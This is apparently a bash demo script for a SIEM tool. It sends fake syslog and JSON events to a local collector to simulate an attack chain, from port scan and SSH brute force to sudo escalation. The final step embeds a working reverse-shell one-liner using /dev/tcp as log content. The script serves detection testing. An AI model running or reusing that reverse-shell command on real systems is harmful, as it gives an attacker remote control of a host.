#!/usr/bin/env bash
# NanoSIEM Kill Chain Demo
# Uses 1.1.1.1 (Cloudflare DNS, Australia) — a real public IP that geolocates
# correctly and shows on the Threat Map.

set -e

SYSLOG_HOST="${SIEM_HOST:-localhost}"
SYSLOG_PORT="${SIEM_SYSLOG_PORT:-5140}"
JSON_PORT="${SIEM_JSON_PORT:-5141}"
ATTACKER_IP="1.1.1.1"   # Real public IP — geolocates to Brisbane, Australia (Cloudflare)

echo "  NanoSIEM Kill Chain Demo"
echo "  Target: ${SYSLOG_HOST}:${SYSLOG_PORT} (syslog) / ${SYSLOG_HOST}:${JSON_PORT} (JSON)"
echo "  Simulated attacker: ${ATTACKER_IP} (Cloudflare — will show on Threat Map)"

send_syslog() { printf '%s' "$1" | nc -q1 "${SYSLOG_HOST}" "${SYSLOG_PORT}"; }
send_json()   { printf '%s' "$1" | nc -q1 "${SYSLOG_HOST}" "${JSON_PORT}"; }

echo "  [Step 1] Reconnaissance — port scan"
send_syslog "CEF:0|Snort|IDS|2.9|1000001|Port Scan Detected|8|src=${ATTACKER_IP} spt=12345 dst=10.0.0.1 dpt=22 cnt=500"
echo "  → Sent: CEF port scan alert"
sleep 1

echo "  [Step 2] Credential Access — brute force x3"
send_syslog "<34>1 2026-06-02T03:00:01Z web-01 sshd 1234 - - Failed password for root from ${ATTACKER_IP} port 22 ssh2"
echo "  → Sent: Brute force attempt 1"
sleep 1
send_syslog "<34>1 2026-06-02T03:00:03Z web-01 sshd 1234 - - Failed password for root from ${ATTACKER_IP} port 22 ssh2"
echo "  → Sent: Brute force attempt 2"
sleep 1
send_syslog "<34>1 2026-06-02T03:00:05Z web-01 sshd 1234 - - Failed password for invalid user admin from ${ATTACKER_IP} port 22 ssh2"
echo "  → Sent: Brute force attempt 3"
sleep 1

echo "  [Step 3] Initial Access — successful login"
send_syslog "<34>1 2026-06-02T03:01:00Z web-01 sshd 1235 - - Accepted password for deploy from ${ATTACKER_IP} port 54321 ssh2"
echo "  → Sent: Successful SSH login"
sleep 1

echo "  [Step 4] Privilege Escalation — sudo to root"
send_syslog "<34>1 2026-06-02T03:02:00Z web-01 sudo 1236 - - deploy ran COMMAND=/bin/bash as root uid=0 euid=0"
echo "  → Sent: Sudo privilege escalation"
sleep 1

echo "  [Step 5] Command and Control — reverse shell"
send_json '{"host":"web-01","process":"bash","message":"/bin/bash -i >& /dev/tcp/'"${ATTACKER_IP}"'/4444 0>&1","level":"critical","timestamp":"2026-06-02T03:03:00Z"}'
echo "  → Sent: Reverse shell beacon"

echo ""
echo "  Kill chain complete."
echo "  Expected alerts: SIGMA hits, CHAIN correlation, ML anomalies, STIX bundles"
echo "  Threat Map: go to Threat Map tab — 1.1.1.1 will show as Brisbane, Australia"
